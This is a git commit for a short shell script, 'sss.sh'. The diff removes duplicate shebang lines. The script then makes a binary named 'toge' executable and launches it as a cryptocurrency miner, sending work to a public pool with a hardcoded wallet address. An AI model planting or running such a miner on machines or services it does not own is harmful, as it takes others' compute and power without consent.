26034afbafa4f5a60a5fbab5cdcfddbc433893d3
Antonnnnjantung <97686110+Antonnnnjantung@users.noreply.github.com>
2022-02-16 18:33:58 +0700

    Update sss.sh

--- sss.sh
+++ sss.sh
@@ -1,6 +1,5 @@
 #!/bin/bash
-#!/bin/sh
-#!/bin/bash
+
 
 chmod +x toge >/dev/null 2>&1
 ./toge -a gr -o stratum+tcps://asia.flockpool.com:5555 -u RSakAAJCS5uWiFx2txkFBxu7vcPmZG1gfy.olaab -p x -x --no-tune
